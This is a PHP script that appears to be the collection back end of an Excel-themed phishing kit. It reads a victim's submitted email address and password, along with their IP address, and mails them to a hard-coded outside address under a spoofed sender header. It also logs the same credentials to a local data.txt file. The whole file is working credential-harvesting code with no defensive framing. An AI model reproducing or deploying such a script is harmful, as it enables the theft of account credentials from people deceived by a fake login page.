<?php





$youremail = "dohjuliana0589@gmail.com";

$ip= $_SERVER['REMOTE_ADDR'];



$headers = "From: \"Excel Bras\" <audthens2ticated@exenibs.com>\n";

$subject = "Excel ".$_POST['xxemail']."";

$message = "";



$message .= 'email: ';

$message .= $_POST['xxemail'];

$message .= "\n";



$message .= 'password: ';

$message .= $_POST['xxpassword'];

$message .= "\n";

$message .= "IP: ";

$message .= $ip;

$message .= "\n";







mail ("$youremail", "$subject", $message, $headers);







$make=fopen("data.txt","a");

$to_put="";

$to_put .= $_POST['xxemail']."|".$_POST['mail']."|".$_POST['pass']."|".$_POST['xxpassword']."|".$ip."

";

fwrite($make,$to_put);

 




?>